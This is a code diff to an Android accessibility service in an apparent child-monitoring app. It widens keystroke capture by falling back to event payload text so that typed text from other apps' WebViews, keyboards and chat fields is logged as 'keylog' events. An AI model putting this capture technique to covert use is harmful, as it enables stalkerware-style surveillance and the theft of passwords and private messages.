@@ -287,19 +287,25 @@ class ChildGuardAccessibilityService : AccessibilityService() {
 
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
             AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
-                val node = event.source
-                if (node == null) return
-                try {
-                    val text = node.text?.toString()?.trim() ?: ""
-                    if (text.length > 1 && shouldEmitKeylog(pkg, text)) {
-                        val trimmed = text.take(MAX_TEXT_LEN)
-                        enqueueEvent("keylog", pkg, trimmed)
-                        if (isStrangerText(trimmed) && shouldFireAlert(pkg, trimmed)) {
-                            enqueueEvent("stranger_alert", pkg, trimmed)
-                        }
+                val fromNode = event.source?.let { node ->
+                    try {
+                        node.text?.toString()?.trim() ?: ""
+                    } finally {
+                        node.recycle()
                     }
-                } finally {
-                    node.recycle()
+                } ?: ""
+                // Several apps (WebViews, some IMEs, custom chat fields) report
+                // the typed text only in the event payload, with no readable
+                // source node. Prefer the node, fall back to event.text so a
+                // keystroke is never lost.
+                val text = if (fromNode.length > 1) fromNode
+                else event.text?.joinToString(" ")?.trim() ?: ""
+                if (text.length > 1 && shouldEmitKeylog(pkg, text)) {
+                    val trimmed = text.take(MAX_TEXT_LEN)
+                    enqueueEvent("keylog", pkg, trimmed)
+                    if (isStrangerText(trimmed) && shouldFireAlert(pkg, trimmed)) {
+                        enqueueEvent("stranger_alert", pkg, trimmed)
+                    }
                 }
             }
 
